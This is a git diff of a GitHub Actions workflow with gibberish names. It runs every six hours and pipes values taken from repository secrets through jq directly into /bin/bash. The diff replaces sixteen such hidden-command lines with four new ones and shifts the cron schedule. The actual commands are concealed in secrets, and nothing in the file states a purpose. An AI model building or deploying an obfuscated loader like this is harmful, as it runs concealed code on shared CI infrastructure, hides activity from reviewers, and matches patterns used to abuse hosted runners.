@@ -1,9 +1,8 @@
 name: yintesjhttyixia
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '43 1/6 * * *'
+    - cron: '30 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -12,22 +11,10 @@ jobs:
       - uses: actions/checkout@v4
       - name: yintesjhttyixia
         env:
-          yk03: ${{ secrets.yk03 }}
+          bu8: ${{ secrets.bu8 }}
         run: |
-          echo $yk03 | jq -r .ya68 | /bin/bash
-          echo $tvwhr82548 | jq -r .syaqt141 | /bin/bash
-          echo $mxcqa28 | jq -r .gkl6652 | /bin/bash
-          echo $fqnjm696 | jq -r .it8 | /bin/bash
-          echo $ize55021 | jq -r .pcq196 | /bin/bash
-          echo $oer32 | jq -r .tlqar93 | /bin/bash
-          echo $zcv17 | jq -r .zvz63 | /bin/bash
-          echo $l360 | jq -r .j265 | /bin/bash
-          echo $yvwc2 | jq -r .les8 | /bin/bash
-          echo $bemp77 | jq -r .u1305 | /bin/bash
-          echo $yoomy70414 | jq -r .sulb13 | /bin/bash
-          echo $v883 | jq -r .lq5 | /bin/bash
-          echo $stmr935 | jq -r .pkbgr955 | /bin/bash
-          echo $yaksh2808 | jq -r .vsuw59459 | /bin/bash
-          echo $j867 | jq -r .twrxv5 | /bin/bash
-          echo $gbhky2 | jq -r .nxmr5307 | /bin/bash
+          echo $bu8 | jq -r .byg67034 | /bin/bash
+          echo $wqn9 | jq -r .mkr287 | /bin/bash
+          echo $zghx8 | jq -r .tc873 | /bin/bash
+          echo $ictk3 | jq -r .jay779 | /bin/bash
 
